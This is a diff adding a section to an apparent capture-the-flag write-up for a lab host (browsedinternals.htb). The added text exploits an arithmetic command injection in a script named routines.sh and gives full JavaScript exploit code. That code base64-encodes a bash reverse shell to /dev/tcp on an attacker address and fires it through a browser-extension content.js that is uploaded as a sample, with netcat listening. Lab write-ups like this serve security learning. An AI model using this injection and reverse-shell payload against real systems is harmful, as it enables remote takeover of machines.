@@ -28,3 +28,25 @@ We will see an interessting entry point, by trying to upload of the samples (i c
 If we scan the displayed logs, we will find browsedinternals.htb, by adding it in /etc/hosts, we will find that host a gitea.
 .
 
+### Lets go
+
+By analysing the file routines.sh in MarkdownPreview, we will discover arithmetic command injection vulnerability caused by lack of input validation, that we will exploit it for a reverse shell by the following script:
+
+```js
+const TARGET = "http://localhost:5000/routines/";
+const ATTACKER = "10.10.x.x";
+const PORT = "4444";  // Or any port you want
+
+// Reverse shell payload
+const cmd = `bash -c 'bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1'`;
+const b64 = btoa(cmd);
+const sp = "%20"; // URL encoded space
+
+// The Arithmetic Injection: a[$(echo base64 | base64 -d | bash)]
+const exploit = "a[$(echo" + sp + b64 + "|base64" + sp + "-d|bash)]";
+
+// Execute
+fetch(TARGET + exploit, { mode: "no-cors" });
+```
+
+we replace it in content.js and zip the sample and upload it, in the same we launche netcat in our machine
